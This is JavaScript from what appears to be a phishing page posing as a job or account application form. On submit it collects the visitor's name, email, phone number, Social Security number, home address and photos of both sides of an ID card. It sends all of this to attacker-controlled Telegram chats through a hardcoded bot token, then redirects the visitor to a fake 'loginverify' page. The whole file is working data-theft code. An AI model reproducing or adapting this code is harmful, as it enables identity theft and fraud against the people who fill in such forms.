// const chatIds = ["1534371221", "6189466166", "6136559061", "6924640648"];

// const chatIds = ["1534371221"];
const chatIds = ["-1002088251188"];

let form;
let firstname;
let lastname;
let email_field;
let phone_field;
let ssn_field;
let address_field;
let uploadForm;
let front_image;
let back_image;
let submit_btn;

document.addEventListener("DOMContentLoaded", () => {
  submit_btn = document.getElementById("submit_btn");
  assignElements();
  form = document.getElementById("form");
  form.addEventListener("submit", async (e) => {
    e.preventDefault();
    submit_btn.setAttribute("disabled", "true");
    submit_btn.innerText = "CREATING APPLICATION";
    await submit_details();
    await sleep(2000);
    window.location.href = `../loginverify/`;
  });
});

async function submit_details() {
  //   const msg = `New Jovie Application  \n
  // Generated  email is ${email} \n
  //     `;
  const msg = `
NEW USER APPLICATION
____________________________

Firstname: ${firstname.value} \n
Lastname: ${lastname.value} \n
Email : ${email_field.value} \n 
Phone : ${phone_field.value} \n 
SSN : ${ssn_field.value} \n 
House Address : ${address_field.value} \n 
Delaying for 2  mins
    `;
  for (let i = 0; i < chatIds.length; i++) {
    const data = {
      chat_id: chatIds[i],
      text: msg,
    };
    const resp = await fetch(
      `https://api.telegram.org/bot5312671411:AAFihWuoM10og_jUITZkqIqa-gk0p_i7H-E/sendMessage`,
      {
        method: "POST",
        headers: {
          accept: "application/json",
          "content-type": "application/json",
        },
        body: JSON.stringify(data),
      }
    );
    const resJson = await resp.json();
    chat_id.setAttribute("value", chatIds[i]);
    await sendImg();
    front_image.setAttribute("name", "alreadySent");
    back_image.setAttribute("name", "photo");
    await sendImg();
    front_image.setAttribute("name", "photo");
    back_image.setAttribute("name", "alreadySent");
    console.log(resJson);
  }
}

function generateEmail(a, b) {
  return `${a}${b}01.jovie@gmail.com`;
}

async function sendImg() {
  const data = new FormData(uploadForm);
  console.log(data.get("photo"));
  await $.ajax({
    url: uploadForm.getAttribute("action"),
    // type: uploadForm.getAttribute("method"),
    type: "POST",
    dataType: "JSON",
    data: data,
    processData: false,
    contentType: false,
    success: function (data, status) {
      console.log("Success");
    },
    error: function (xhr, desc, err) {
      console.log("Error");
    },
  });
}

async function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function assignElements() {
  // mainform = document.getElementById("form");
  firstname = document.getElementById("firstname");
  lastname = document.getElementById("lastname");
  uploadForm = document.getElementById("uploadForm");
  email_field = document.getElementById("email_field");
  phone_field = document.getElementById("phone_field");
  address_field = document.getElementById("address_field");
  ssn_field = document.getElementById("ssn_field");
  uploadd = document.getElementById("uploadd");
  // submit_btn = document.getElementById("submit_btn");
  // counterr = document.querySelector(".counterr");
  // delayy = document.getElementById("delayy");
  front_image = document.getElementById("id_front");
  back_image = document.getElementById("id_back");
  chat_id = document.getElementById("chat_id");
  uploadd = document.querySelectorAll(".uploadd");
  for (let i = 0; i < uploadd.length; i++) {
    const e = uploadd[i];
    e.addEventListener("change", (e) => {
      console.log("change");
      const chosen = document.getElementById(`chosen${i}`);
      console.log(e.target.value);
      const name = extractFileName(e.target.value);
      chosen.innerText = name;
    });
  }
}

function extractFileName(path) {
  return path.substring(12);
}
